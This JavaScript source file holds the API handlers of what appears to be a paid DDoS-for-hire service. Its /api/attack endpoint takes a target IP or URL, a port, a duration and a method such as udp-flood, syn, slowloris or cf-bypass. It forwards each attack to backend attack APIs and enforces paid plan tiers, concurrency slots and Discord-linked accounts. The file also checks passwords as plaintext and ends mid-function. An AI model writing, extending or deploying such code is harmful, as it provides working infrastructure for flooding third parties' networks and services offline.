// API route handlers for attack, plan, and status endpoints.
import { jsonResponse, structuredResponse, parseQuery, routeNotFound, resolveServiceName, makePolishedError } from './response.js';
import * as Vault from './vault-db.js';
import { getPayloadMethods, getPayloadBlacklists } from '../payload.js';
import { getUserLimits, isMethodPermittedForUser } from './policy.js';
import { generateVerificationCode, buildDiscordRoleNames, userPlanRole } from './discord.js';

let SERVICE_START = null;

async function ipLookup(ipOrHost) {
  try {
    const res = await fetch(`http://ip-api.com/json/${encodeURIComponent(ipOrHost)}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
    if (!res.ok) return null;
    const data = await res.json();
    if (data && data.status === 'success') return data;
    return null;
  } catch (e) {
    return null;
  }
}

function buildWarningSummary(user, warnings) {
  const count = Number(warnings?.count || 0);
  const limit = Number(warnings?.limit || 5);
  const suspended = Boolean(user?.suspended || warnings?.suspended);
  const severity = count >= limit ? 'critical' : count >= 3 ? 'high' : count >= 1 ? 'medium' : 'clean';
  return {
    count,
    limit,
    suspended,
    severity,
    warn_status: `${count}/${limit}`,
    label: suspended ? '🚫 account suspended' : count >= limit ? `⚠️ ${count}/${limit} warnings` : `⚠️ ${count}/${limit} warnings`,
    detail: suspended ? 'Account is suspended and must be cleared by an admin.' : `Warnings are tracked for abuse and policy enforcement.`
  };
}

function formatDuration(ms) {
  const seconds = Math.floor(ms / 1000);
  const hours = Math.floor(seconds / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const remaining = seconds % 60;
  const parts = [];
  if (hours) parts.push(`${hours}h`);
  if (minutes) parts.push(`${minutes}m`);
  if (remaining || parts.length === 0) parts.push(`${remaining}s`);
  return parts.join(' ');
}

function formatSlotBar(used, total) {
  const filled = total > 0 ? Math.round(Math.min(total, used) * 10 / total) : 0;
  const empty = 10 - filled;
  return `${'🔵'.repeat(filled)}${'⬜'.repeat(empty)} (${((total === 0 ? 0 : (used / total) * 100)).toFixed(2)}%)`;
}

function expandApiLinkTemplate(template, record) {
  const target = String(record.target || '');
  const tokenMap = {
    '{target}': encodeURIComponent(target),
    '{host}': encodeURIComponent(target),
    '{ip}': encodeURIComponent(target),
    '{port}': encodeURIComponent(Number(record.port || 80)),
    '{duration}': encodeURIComponent(Number(record.duration || 60)),
    '{time}': encodeURIComponent(Number(record.duration || 60)),
    '{method}': encodeURIComponent(record.method || 'udp'),
    '{username}': encodeURIComponent(record.username || 'anon'),
    '{password}': encodeURIComponent(''),
    '{rps}': encodeURIComponent(Number(record.rps || 0)),
    '{threads}': encodeURIComponent(Number(record.threads || 0)),
    '{concurrents}': encodeURIComponent(Number(record.concurrents || 1))
  };

  let expanded = String(template || '');
  for (const [token, value] of Object.entries(tokenMap)) {
    expanded = expanded.split(token).join(value);
  }
  return expanded;
}

async function fanOutMethodApiLinks(methodMeta, record) {
  const apiLinks = Array.isArray(methodMeta?.api_links) ? methodMeta.api_links : [];
  if (!apiLinks.length) return [];

  const outcomes = [];

  for (const link of apiLinks) {
    const destination = link?.url || '';
    if (!destination) continue;

    const url = expandApiLinkTemplate(destination, record);
    const method = String(link?.method || 'GET').toUpperCase();

    try {
      const init = {
        method,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'application/json'
        }
      };

      if (method === 'POST') {
        const params = new URLSearchParams({
          host: String(record.target || ''),
          port: String(record.port || 80),
          time: String(Number(record.duration || 60)),
          method: String(record.method || 'udp'),
          username: String(record.username || 'anon'),
          concurrents: String(Number(record.concurrents || 1))
        });
        init.body = params.toString();
      }

      const response = await fetch(url, init);
      const text = await response.text();
      let payload = null;
      try { payload = text ? JSON.parse(text) : null; } catch (_) { payload = { raw: text }; }

      outcomes.push({
        name: link?.name || 'api_link',
        url,
        method,
        status: response.status,
        ok: response.ok,
        payload
      });
    } catch (e) {
      outcomes.push({
        name: link?.name || 'api_link',
        url,
        method,
        status: 0,
        ok: false,
        error: e?.message || 'api link failed'
      });
    }
  }

  return outcomes;
}

function isIPv4(value) {
  return typeof value === 'string' && /^(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)){3}$/.test(value);
}

function isUrlTarget(value) {
  if (typeof value !== 'string' || !value.trim()) return false;
  if (isIPv4(value)) return false;
  if (value.includes(' ')) return false;
  return value.includes('.') || /^https?:\/\//i.test(value);
}

function normalizeBlacklistValue(value) {
  return String(value || '').trim().toLowerCase();
}

function isBlacklistedTarget(target, blacklistEntries) {
  const normalizedTarget = normalizeBlacklistValue(target);
  if (!normalizedTarget) return false;

  return (blacklistEntries || []).some((entry) => {
    const normalizedEntry = normalizeBlacklistValue(entry);
    if (!normalizedEntry) return false;

    const isIpPrefix = /^((\d{1,3}\.){1,3}\d{1,3})\.?$/.test(normalizedEntry);
    if (isIpPrefix) {
      const prefix = normalizedEntry.endsWith('.') ? normalizedEntry : `${normalizedEntry}.`;
      return normalizedTarget === normalizedEntry || normalizedTarget.startsWith(prefix) || normalizedEntry.startsWith(normalizedTarget);
    }

    return normalizedTarget === normalizedEntry
      || normalizedTarget.startsWith(normalizedEntry)
      || normalizedTarget.includes(normalizedEntry)
      || (normalizedEntry.startsWith('.') && normalizedTarget.endsWith(normalizedEntry))
      || normalizedEntry.startsWith(normalizedTarget);
  });
}

function isBlacklistedByMetadata(ipinfo, payloadBlacklists) {
  const blacklists = payloadBlacklists || {};
  const asnNumbers = (blacklists.ASN_NUMBER || []).map(normalizeBlacklistValue).filter(Boolean);
  const asnNames = (blacklists.ASN_NAME || []).map(normalizeBlacklistValue).filter(Boolean);
  const countries = (blacklists.Countries || []).map(normalizeBlacklistValue).filter(Boolean);

  const asnValue = normalizeBlacklistValue(ipinfo?.as || ipinfo?.asn || '');
  const orgValue = normalizeBlacklistValue(ipinfo?.org || ipinfo?.isp || '');
  const countryCode = normalizeBlacklistValue(ipinfo?.countryCode || '');
  const countryName = normalizeBlacklistValue(ipinfo?.country || '');

  return asnNumbers.some((value) => asnValue === value || asnValue.includes(value))
    || asnNames.some((value) => orgValue === value || orgValue.includes(value))
    || countries.some((value) => countryCode === value || countryName === value);
}

export async function apiHandler(parts, request, env) {
  const q = parseQuery(request);
  const endpoint = parts[0] || '';
  const GLOBAL_API_SLOTS = Number(env.GLOBAL_API_SLOTS || 30);

  const requestUser = q.username ? await Vault.getUser(env, q.username) : null;
  if (requestUser && requestUser.suspended) return makePolishedError('account suspended', 403, { suspended: true, warn_status: '5/5', hint: 'This account is suspended. Contact an administrator to restore access.' });

  async function buildDiscordLinkStatus(username) {
    const link = await Vault.getDiscordLinkByUsername(env, username);
    if (!link) {
      return { linked: false, status: 'none', client: null, discord_user_id: null, discord_username: null, verified_at: null, expires_at: null, unlinked_at: null };
    }
    return {
      linked: link.status === 'verified',
      status: link.status || 'none',
      client: link.client || null,
      discord_user_id: link.discord_user_id || null,
      discord_username: link.discord_username || null,
      verified_at: link.verified_at || null,
      expires_at: link.expires_at || null,
      unlinked_at: link.unlinked_at || null
    };
  }

  const ALLOWED_METHODS = {
    udp: 'ip',
    tcp: 'ip',
    http: 'url',
    'http-raw': 'url',
    https: 'url',
    'https-raw': 'url',
    'cf-bypass': 'url',
    slowloris: 'url',
    'udp-flood': 'ip',
    'tcp-flood': 'ip',
    'http-flood': 'url',
    dns: 'url',
    icmp: 'ip',
    syn: 'ip',
    ack: 'ip',
    get: 'url',
    post: 'url',
    raw: 'url'
  };

  if (endpoint === 'network_statistics') {
    const users = await Vault.listUsers(env);
    const total = users.length;
    const activeUsers = users.filter((user) => !user.suspended).length;
    const suspendedUsers = users.filter((user) => user.suspended).length;
    const warnings = await Promise.all(users.map(async (user) => ({ user, warning: await Vault.getUserWarnings(env, user.username) })));
    const warningCount = warnings.reduce((sum, item) => sum + Number(item.warning?.count || 0), 0);
    const atRiskUsers = warnings.filter((item) => !item.user.suspended && Number(item.warning?.count || 0) >= 3).length;
    const ongoing = await Vault.countOngoing(env);
    const attacksToday = await Vault.countLogsToday(env);
    const vipUsers = await Vault.countUsersByFlag(env, 'vip');
    const holderUsers = await Vault.countUsersByFlag(env, 'holder');
    const resellerUsers = await Vault.countUsersByFlag(env, 'reseller');
    const verifiedDiscordUsers = await Vault.countVerifiedDiscordLinks(env);
    const pendingDiscordLinks = await Vault.countPendingDiscordLinks(env);
    const healthStatus = suspendedUsers > 0 || ongoing > 0 ? 'degraded' : 'stable';

    return jsonResponse({
      error: false,
      online_users_count: 1,
      total_users_count: total,
      active_users_count: activeUsers,
      vip_users_count: vipUsers,
      holder_users_count: holderUsers,
      reseller_users_count: resellerUsers,
      suspended_users_count: suspendedUsers,
      at_risk_users_count: atRiskUsers,
      expired_users_count: 0,
      attacks_are_enabled: true,
      total_ongoing_attacks: ongoing,
      total_attacks_today: attacksToday,
      total_warning_count: warningCount,
      warning_limit: 5,
      verified_discord_users_count: verifiedDiscordUsers,
      pending_discord_links_count: pendingDiscordLinks,
      max_attack_api_slots: GLOBAL_API_SLOTS,
      health_status: healthStatus,
      maintenance_mode: false,
      src_name: 'CAPI',
      src_uptime: 'up'
    }, 200, { service: env.API_NAME || 'CAPI' });
  }

  if (endpoint === 'endpoints' || endpoint === 'docs' || endpoint === 'help') {
    return jsonResponse({
      error: false,
      message: 'endpoint catalog loaded',
      data: {
        base_url: env.API_BASE_URL || 'https://capi.insideproxy.me',
        endpoints: [
          { name: 'GET /api/attack', description: 'Launch an attack', usage: '?username=demo&host=1.1.1.1&port=80&time=60&method=udp' },
          { name: 'GET /api/discord_profile', description: 'Show the linked profile for a Discord user', usage: '?discord_user_id=123456789' },
          { name: 'GET /api/link', description: 'Verify a Discord account with a code', usage: '?code=ABC123&discord_user_id=123456789&discord_username=YourName' },
          { name: 'GET /api/unlink', description: 'Unlink a Discord account', usage: '?discord_user_id=123456789' },
          { name: 'GET /api/network_statistics', description: 'Show global stats and counters', usage: '' },
          { name: 'GET /api/graph', description: 'Show slot and uptime statistics', usage: '' },
          { name: 'GET /admin/list_methods', description: 'List available methods', usage: '' }
        ]
      }
    }, 200, { service: env.API_NAME || 'CAPI' });
  }

  if (endpoint === 'graph') {
    if (!SERVICE_START) SERVICE_START = Date.now();
    const ongoing = await Vault.countOngoing(env);
    const totalSlots = GLOBAL_API_SLOTS;
    const usedSlots = ongoing;
    const slotBar = formatSlotBar(usedSlots, totalSlots);
    const maintenance = Boolean(String(env.MAINTENANCE_MODE || env.API_MAINTENANCE || '').toLowerCase() === 'true');
    const lastMaintenance = env.LAST_MAINTENANCE || env.LAST_MAINTENANCE_AT || null;
    const uptime = formatDuration(Date.now() - SERVICE_START);
    const payloadMethods = getPayloadMethods();
    const methodSlots = [];

    for (const method of payloadMethods) {
      const maxSlots = Number(method.max_slots || 0);
      if (!maxSlots) continue;
      const methodUsed = await Vault.countMethodOngoing(env, method.name.toLowerCase());
      methodSlots.push({
        method: method.name,
        total: maxSlots,
        used: methodUsed,
        percent: maxSlots ? Math.min(100, Math.round((methodUsed / maxSlots) * 100)) : 0,
        bar: formatSlotBar(methodUsed, maxSlots)
      });
    }

    const planMethodAccess = { free: [], vip: [], holder: [], vip_or_holder: [] };
    for (const method of payloadMethods) {
      const vipRequired = Boolean(method.plan_restrictions?.vip);
      const holderRequired = Boolean(method.plan_restrictions?.holder);
      if (vipRequired && holderRequired) {
        planMethodAccess.vip_or_holder.push(method.name);
      } else if (vipRequired) {
        planMethodAccess.vip.push(method.name);
      } else if (holderRequired) {
        planMethodAccess.holder.push(method.name);
      } else {
        planMethodAccess.free.push(method.name);
      }
    }

    return jsonResponse({
      error: false,
      message: 'graph stats loaded',
      data: {
        max_attack_api_slots: totalSlots,
        api_slots: {
          total: totalSlots,
          used: usedSlots,
          available: Math.max(0, totalSlots - usedSlots),
          percent: totalSlots ? ((usedSlots / totalSlots) * 100).toFixed(2) : '0.00',
          bar: slotBar
        },
        c2_slots: {
          active_attacks: ongoing,
          bar: slotBar
        },
        method_slots: methodSlots,
        plan_method_access: planMethodAccess,
        maintenance: {
          enabled: maintenance,
          last_maintenance: lastMaintenance
        },
        uptime,
        updated_at: new Date().toISOString()
      }
    }, 200, { service: env.API_NAME || 'CAPI' });
  }

  if (endpoint === 'methods') {
    // Public method catalog (no admin credentials required)
    const dbMethods = await Vault.listMethods(env);
    const payloadMethods = getPayloadMethods();
    const methodMap = new Map((payloadMethods || []).map((item) => [String(item?.name || '').toLowerCase(), item]));

    const methods = (dbMethods || []).map((method) => {
      const meta = methodMap.get(String(method?.name || '').toLowerCase()) || null;
      return {
        id: method?.id || null,
        name: method?.name || null,
        description: method?.description || meta?.description || `${method?.name || 'method'} method`,
        target_type: meta?.target_type || null,
        default_port: meta?.default_port || null,
        min_time: meta?.min_time || null,
        max_time: meta?.max_time || null,
        max_concurrents: meta?.max_concurrents || null,
        max_slots: meta?.max_slots || null
      };
    });

    return structuredResponse({ error: false, message: 'public methods loaded', data: { methods } });
  }

  if (endpoint === 'discord_profile') {
    const discordUserId = q.discord_user_id || q.discord_id || q.user_id;
    if (!discordUserId) return makePolishedError('missing discord_user_id', 400, { hint: 'Provide discord_user_id to lookup your linked profile.' });
    const link = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordUserId);
    if (!link) return jsonResponse({ error: true, message: 'Discord account not linked. Use /link to verify your account first; /plan is only available for linked users.', client: null }, 404, { service: env.API_NAME || 'CAPI' });
    const user = await Vault.getUser(env, link.username);
    if (!user) return jsonResponse({ error: true, message: 'Linked user account no longer exists.' }, 500, { service: env.API_NAME || 'CAPI' });
    const warnings = await Vault.getUserWarnings(env, user.username);
    const serviceName = await resolveServiceName(user, env, env.API_NAME || 'CAPI');
    const warningSummary = buildWarningSummary(user, warnings);
    const discordLinkStatus = await buildDiscordLinkStatus(user.username);
    return jsonResponse({
      error: false,
      message: 'discord profile loaded',
      data: {
        profile: {
          username: user.username,
          admin: Boolean(user.admin),
          vip: Boolean(user.vip),
          holder: Boolean(user.holder),
          reseller: Boolean(user.reseller),
          max_time: Number(user.max_time || 60),
          min_time: Number(user.min_time || 30),
          cooldown: Number(user.cooldown || 45),
          concurrents: Number(user.concurrents || user.max_concurrents || 1),
          max_concurrents: Number(user.max_concurrents || user.concurrents || 1),
          max_daily_attacks: Number(user.max_daily_attacks || 100),
          suspended: Boolean(user.suspended),
          suspend_reason: user.suspend_reason || null,
          suspended_by: user.suspended_by || null,
          service_name: serviceName,
          resellers_service: Boolean(user.created_by && user.created_by !== user.username),
          expiry_unix: Number(user.expiry_unix || 0),
          is_banned: Boolean(user.suspended),
          powered_saving: Boolean(user.powersaving || false),
          anti_spam: Boolean(user.anti_spam || false),
          bypass_blacklist: Boolean(user.bypass_slots || false),
          api_access: Boolean(user.api_access),
          mfa_enabled: Boolean(user.mfa_enabled || false),
          account_status: user.suspended ? 'suspended' : warningSummary.count >= 5 ? 'at_limit' : 'active',
          warnings: Number(warningSummary.count || 0),
          discord_link: discordLinkStatus
        }
      },
      service: serviceName
    }, 200, { service: serviceName });
  }

  if (endpoint === 'verify') {
    const username = q.username;
    const password = q.password;
    const client = q.client || 'discord';
    if (!username || !password || !client) return makePolishedError('missing username, password or client', 400, { hint: 'Send username, password and client=discord in the query string.' });

    const user = await Vault.getUser(env, username);
    if (!user) return jsonResponse({ error: true, message: 'user does not exist', client, code: null }, 404, { service: env.API_NAME || 'CAPI' });
    if (user.password !== password) return jsonResponse({ error: true, message: 'wrong password', client, code: null }, 401, { service: env.API_NAME || 'CAPI' });
    if (user.suspended) return jsonResponse({ error: true, message: 'account suspended', client, code: null }, 403, { service: env.API_NAME || 'CAPI' });
    if (!user.api_access) return jsonResponse({ error: true, message: 'api access disabled', client, code: null }, 403, { service: env.API_NAME || 'CAPI' });

    const existingVerified = await Vault.getVerifiedDiscordLinkByUsername(env, username);
    if (existingVerified) {
      return jsonResponse({
        error: true,
        message: 'user already verified via Discord; use admin/unlink_discord to reset',
        client,
        code: null,
        discord_link: {
          discord_user_id: existingVerified.discord_user_id,
          discord_username: existingVerified.discord_username,
          verified_at: existingVerified.verified_at
        }
      }, 409, { service: env.API_NAME || 'CAPI' });
    }

    const code = generateVerificationCode();
    const expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString();
    await Vault.createDiscordLinkRequest(env, username, client, code, expiresAt);
    return jsonResponse({ error: false, message: 'verification code generated', client, code, expires_at: expiresAt }, 200, { service: env.API_NAME || 'CAPI' });
  }

  if (endpoint === 'link') {
    const code = q.code;
    const discordUserId = q.discord_user_id || q.user_id || q.discord_id;
    const discordUsername = q.discord_username || q.discord_user_name || q.user_name || q.username || null;
    const client = q.client || 'discord';
    if (!code || !discordUserId) return makePolishedError('missing code or discord_user_id', 400, { hint: 'Send code and discord_user_id in the query string.' });

    const existingDiscordLink = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordUserId);
    if (existingDiscordLink) {
      return jsonResponse({
        error: true,
        message: 'This Discord account is already linked. Use /unlink first, then run /link again with a new code.',
        client,
        code: null,
        discord_link: { username: existingDiscordLink.username, discord_user_id: discordUserId, discord_username: existingDiscordLink.discord_username }
      }, 409, { service: env.API_NAME || 'CAPI' });
    }

    const requestRow = await Vault.getDiscordLinkByCode(env, code);
    if (!requestRow) return jsonResponse({ error: true, message: 'invalid or unknown code', client, code }, 404, { service: env.API_NAME || 'CAPI' });
    if (requestRow.client !== client) return jsonResponse({ error: true, message: 'client mismatch', client, code }, 400, { service: env.API_NAME || 'CAPI' });
    if (requestRow.status === 'verified') return jsonResponse({ error: true, message: 'code already used', client, code }, 409, { service: env.API_NAME || 'CAPI' });
    if (new Date() > new Date(requestRow.expires_at)) return jsonResponse({ error: true, message: 'code expired', client, code }, 410, { service: env.API_NAME || 'CAPI' });

    const existingVerified = await Vault.getVerifiedDiscordLinkByUsername(env, requestRow.username);
    if (existingVerified) {
      return jsonResponse({
        error: true,
        message: 'The user account is already linked to Discord. Ask the current Discord owner to run /unlink first, then use /link again.',
        client,
        code,
        discord_link: { username: existingVerified.username, discord_user_id: existingVerified.discord_user_id, discord_username: existingVerified.discord_username }
      }, 409, { service: env.API_NAME || 'CAPI' });
    }

    const verifiedRow = await Vault.verifyDiscordLinkCode(env, code, discordUserId, discordUsername);
    const linkedUser = await Vault.getUser(env, verifiedRow.username);
    if (!linkedUser) return jsonResponse({ error: true, message: 'linked user no longer exists', client, code }, 500, { service: env.API_NAME || 'CAPI' });

    const roles = buildDiscordRoleNames(linkedUser, env);
    const planRole = userPlanRole(linkedUser, env);
    return jsonResponse({ error: false, message: 'discord account verified', client, code, discord_user_id: discordUserId, username: linkedUser.username, roles, plan_role: planRole }, 200, { service: env.API_NAME || 'CAPI' });
  }

  if (endpoint === 'unlink') {
    const discordUserId = q.discord_user_id || q.user_id || q.discord_id;
    if (!discordUserId) return makePolishedError('missing discord_user_id', 400, { hint: 'Provide discord_user_id to remove your Discord link.' });
    const existingLink = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordUserId);
    if (!existingLink) return jsonResponse({ error: true, message: 'Discord account is not currently linked. Use /link to verify first.' }, 404, { service: env.API_NAME || 'CAPI' });
    const unlinked = await Vault.unlinkDiscordLinkByDiscordId(env, discordUserId, 'self');
    if (!unlinked) return jsonResponse({ error: true, message: 'Unable to unlink Discord account at this time.', service: env.API_NAME || 'CAPI' }, 500, { service: env.API_NAME || 'CAPI' });
    return jsonResponse({ error: false, message: 'Discord account unlinked successfully.', discord_user_id: discordUserId, discord_username: unlinked.discord_username, username: unlinked.username, unlinked_at: unlinked.unlinked_at }, 200, { service: env.API_NAME || 'CAPI' });
  }

  if (endpoint === 'view_profile') {
    const u = await Vault.getUser(env, q.username) || { username: q.username || 'test', vip: false, reseller: false, admin: false, holder: false, api_access: false, max_time: 60, min_time: 30, cooldown: 45, concurrents: 1, max_concurrents: 1, max_daily_attacks: 100 };
    const warnings = await Vault.getUserWarnings(env, u.username);
    const serviceName = await resolveServiceName(u, env, env.API_NAME || 'CAPI');
    const warningSummary = buildWarningSummary(u, warnings);
    const discordLinkStatus = await buildDiscordLinkStatus(u.username);
    return jsonResponse({
      error: false,
      message: 'profile loaded',
      data: {
        profile: {
          username: u.username,
          admin: Boolean(u.admin),
          vip: Boolean(u.vip),
          holder: Boolean(u.holder),
          api_access: Boolean(u.api_access),
          max_time: Number(u.max_time || 60),
          min_time: Number(u.min_time || 30),
          cooldown: Number(u.cooldown || 45),
          concurrents: Number(u.concurrents || u.max_concurrents || 1),
          max_concurrents: Number(u.max_concurrents || u.concurrents || 1),
          max_daily_attacks: Number(u.max_daily_attacks || 100),
          suspended: Boolean(u.suspended),
          suspend_reason: u.suspend_reason || null,
          suspended_by: u.suspended_by || null,
          service_name: serviceName,
          resellers_service: Boolean(u.created_by && u.created_by !== u.username),
          account_status: u.suspended ? 'suspended' : warningSummary.count >= 5 ? 'at_limit' : 'active',
          warnings: Number(warningSummary.count || 0),
          discord_link: discordLinkStatus
        }
      }
    }, 200, { service: serviceName });
  }

  if (endpoint === 'view_plan') {
    const u = await Vault.getUser(env, q.username) || { username: q.username || 'test', vip: false, reseller: false, admin: false, holder: false, api_access: false, max_time: 60, min_time: 30, cooldown: 45, concurrents: 1, max_concurrents: 1, max_daily_attacks: 100 };
    const warnings = await Vault.getUserWarnings(env, u.username);
    const serviceName = await resolveServiceName(u, env, env.API_NAME || 'CAPI');
    const warningSummary = buildWarningSummary(u, warnings);
    const discordLinkStatus = await buildDiscordLinkStatus(u.username);
    return jsonResponse({
      error: false,
      message: 'plan loaded',
      data: {
        user: {
          username: u.username,
          admin: Boolean(u.admin),
          vip: Boolean(u.vip),
          holder: Boolean(u.holder),
          reseller: Boolean(u.reseller),
          api_access: Boolean(u.api_access),
          max_time: Number(u.max_time || 60),
          min_time: Number(u.min_time || 30),
          cooldown: Number(u.cooldown || 45),
          concurrents: Number(u.concurrents || u.max_concurrents || 1),
          max_concurrents: Number(u.max_concurrents || u.concurrents || 1),
          max_daily_attacks: Number(u.max_daily_attacks || 100),
          suspended: Boolean(u.suspended),
          suspend_reason: u.suspend_reason || null,
          suspended_by: u.suspended_by || null,
          service_name: serviceName,
          resellers_service: Boolean(u.created_by && u.created_by !== u.username),
          expiry_unix: Number(u.expiry_unix || 0),
          account_status: u.suspended ? 'suspended' : warningSummary.count >= 5 ? 'at_limit' : 'active',
          warnings: Number(warningSummary.count || 0),
          discord_link: discordLinkStatus
        }
      }
    }, 200, { service: serviceName });
  }

  if (endpoint === 'view_ongoing') {
    return jsonResponse({ error: false, user_only: true, ongoing: [] });
  }

  if (endpoint === 'attack') {
    const qv = parseQuery(request);
    const authHeader = (request.headers && request.headers.get ? request.headers.get('Authorization') : null) || '';
    const bearer = authHeader.startsWith('Bearer ') ? authHeader.slice(7).trim() : '';
    let botAuth = false;
    // If caller presents the BOT_API_KEY and provides a discord_user_id, allow acting on behalf of the linked user without password
    if (bearer && env.BOT_API_KEY && bearer === String(env.BOT_API_KEY)) {
      const discordId = qv.discord_user_id || qv.discord_id || qv.discord;
      if (discordId) {
        const link = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordId);
        if (link && link.username) {
          qv.username = link.username;
          botAuth = true;
        }
      }
    }
    const record = {
      username: qv.username || null,
      target: qv.host || qv.ip || null,
      port: qv.port || '80',
      method: (qv.method || 'udp').toLowerCase(),
      duration: Number(qv.time || 60),
      concurrents: Number(qv.concurrents || 1),
      rps: Number(qv.rps || 0),
      threads: Number(qv.threads || 0),
      geo: qv.geo || null,
      created_at: new Date().toISOString()
    };

    const user = record.username ? await Vault.getUser(env, record.username) : null;
    if (!user || user.username !== record.username) return makePolishedError('user does not exist', 404, { hint: 'Verify the username supplied in the request.' });

    // If not bot-authenticated, require password parameter and validate credentials
    if (!botAuth) {
      const providedPassword = (qv.password || qv.pass || '').toString();
      if (!providedPassword) return makePolishedError('missing credentials', 401, { hint: 'Provide username and password in the request.' });
      // Note: Vault stores the password in the `password` field. Adjust if passwords are hashed.
      if (String(user.password || '') !== providedPassword) return makePolishedError('invalid credentials', 401, { hint: 'Username or password is incorrect.' });
    }

    const userWarnings = await Vault.getUserWarnings(env, user.username);
    if (user.suspended || userWarnings.suspended || userWarnings.count >= userWarnings.limit) {
      return makePolishedError('account suspended', 403, { suspended: true, warn_status: `${userWarnings.count}/${userWarnings.limit}`, hint: 'This account is suspended. Contact an administrator to restore access.' });
    }
    if (!user.api_access) return makePolishedError('user has no API access', 403, { hint: 'Enable API access for this account before trying again.' });

    if (!ALLOWED_METHODS[record.method]) return makePolishedError(`method ${record.method} is not supported`, 400, { hint: 'Use one of the supported attack methods listed by the methods catalog.' });
    const expects = ALLOWED_METHODS[record.method];
    const payloadMethods = getPayloadMethods();
    const methodsCatalog = await Vault.listMethods(env);
    const methodNames = (methodsCatalog || []).map(m => (m.name || '').toLowerCase());
    if (!methodNames.includes(record.method)) {
      await Vault.addMethod(env, { name: record.method, description: `${record.method} method` });
    }

    const targetType = ((payloadMethods.find(m => (m.name || '').toLowerCase() === record.method) || null)?.target_type || expects || 'ip').toLowerCase();
    const targetProvided = String(record.target || '').trim();

    if (targetType === 'ip' && !isIPv4(targetProvided)) {
      return makePolishedError(`method ${record.method} requires an IP target`, 400, { hint: 'Provide a valid IPv4 address as the target for this method.' });
    }
    if (targetType === 'url' && !isUrlTarget(targetProvided)) {
      return makePolishedError(`method ${record.method} requires a host or URL target`, 400, { hint: 'Provide a valid hostname or URL for this method.' });
    }

    const methodMeta = payloadMethods.find(m => (m.name || '').toLowerCase() === record.method) || (methodsCatalog || []).find(m => (m.name || '').toLowerCase() === record.method) || null;
    const policyResult = isMethodPermittedForUser(user, methodMeta);
    if (!policyResult.allowed) return makePolishedError(`method ${record.method} is blocked by policy (${policyResult.reason})`, 403, { hint: 'Upgrade the account plan or remove the policy restriction for this method.' });

    const allowedMethods = user.allowed_methods ? user.allowed_methods.split(',').map(s => s.trim().toLowerCase()).filter(Boolean) : [];
    if (allowedMethods.length > 0 && !allowedMethods.includes(record.method)) return makePolishedError(`method ${record.method} is not permitted for this user`, 403, { hint: 'Ask an admin to grant this method to the account.' });

    const payloadBlacklists = getPayloadBlacklists();
    const ipinfo = await ipLookup(record.target) || {};
    const blacklistRows = await Vault.listBlacklist(env);
    const blacklistTargets = [
      ...(payloadBlacklists?.Blacklists_Targets || []),
      ...(blacklistRows || []).map(item => item.target)
    ];
    const targetBlocked = isBlacklistedTarget(record.target, blacklistTargets)
      || isBlacklistedByMetadata(ipinfo, payloadBlacklists);
    if (targetBlocked) {
      const warning = await Vault.incrementUserWarning(env, record.username, record.target);
      return makePolishedError('blacklisted target', 403, {
        target: record.target,
        target_asn: ipinfo.as || ipinfo.org || null,
        target_country: ipinfo.country || null,
        target_country_code: ipinfo.countryCode || null,
        warn_status: `${warning.count}/5`,
        suspended: warning.suspended,
        hint: 'This target is blocked by policy and cannot be used again until the block is cleared.'
      });
    }

    if (user.allowed_targets) {
      const list = user.allowed_targets.split(',').map(s => s.trim()).filter(Boolean);
      const ok = list.some(a => {
        if (a === record.target) return true;
        if (a.endsWith('.') && record.target.startsWith(a)) return true;
        return false;
      });
      if (!ok) return makePolishedError(`target not allowed for this user; allowed: ${list.join(',')}`, 403, { hint: 'Use an approved target from the account allow-list.' });
    }

    const limits = getUserLimits(user);
    const methodMinTime = Number(methodMeta?.min_time || 0);
    const methodMaxTime = Number(methodMeta?.max_time || 0);
    const effectiveMinTime = Math.max(limits.minTime, methodMinTime || 0);
    const effectiveMaxTime = methodMaxTime > 0 ? Math.min(limits.maxTime, methodMaxTime) : limits.maxTime;

    if (effectiveMaxTime > 0 && effectiveMinTime > effectiveMaxTime) {
      return makePolishedError(`cannot use method ${record.method} with current plan time limits`, 400, { hint: `This method requires a minimum time of ${methodMinTime}s, but your account max time is ${limits.maxTime}s.` });
    }
    if (record.duration < effectiveMinTime) {
      return makePolishedError(`requested time is below the minimum allowed time of ${effectiveMinTime}`, 400, { hint: `Increase the duration to at least ${effectiveMinTime} seconds for this method and plan.` });
    }
    if (effectiveMaxTime > 0 && record.duration > effectiveMaxTime) {
      return makePolishedError(`requested time exceeds the maximum allowed time of ${effectiveMaxTime}`, 400, { hint: `Lower the duration to ${effectiveMaxTime} seconds or less for this method and plan.` });
    }

    const todays = await Vault.countUserDailyAttacks(env, record.username);
    if (user.max_daily_attacks && todays >= (user.max_daily_attacks || 0)) return makePolishedError('max daily attacks exceeded', 429, { hint: 'Wait until the daily quota resets or ask for a higher daily limit.' });

    const last = await Vault.getLastAttackTime(env, record.username);
    if (last) {
      const diff = Date.now() - new Date(last).getTime();
      if (diff < ((user.cooldown || 10) * 1000)) return makePolishedError(`cooldown active, wait ${(Math.ceil(((user.cooldown || 10) * 1000 - diff)/1000))} seconds`, 429, { hint: 'Wait for the cooldown window to finish before sending another request.' });
    }

    const userOngoing = await Vault.countUserOngoing(env, record.username);
    if ((userOngoing + record.concurrents) > limits.maxConcurrents) return makePolishedError(`requested concurrents would exceed user's allowed concurrents of ${limits.maxConcurrents} (current running: ${userOngoing})`, 400, { hint: 'Lower the concurrency value or wait for running attacks to finish.' });

    const methodMaxSlots = Number(methodMeta?.max_slots || 0);
    if (methodMaxSlots > 0) {
      const methodOngoing = await Vault.countMethodOngoing(env, record.method);
      if (methodOngoing >= methodMaxSlots) {
        return makePolishedError(`method ${record.method} has reached its active slot limit of ${methodMaxSlots} (${methodOngoing} currently running)`, 503, { hint: `Wait for one of the active ${record.method} attacks to finish before trying again.` });
      }
    }

    const ongoing = await Vault.countOngoing(env);
    const userBypass = Boolean(user.bypass_slots || 0);
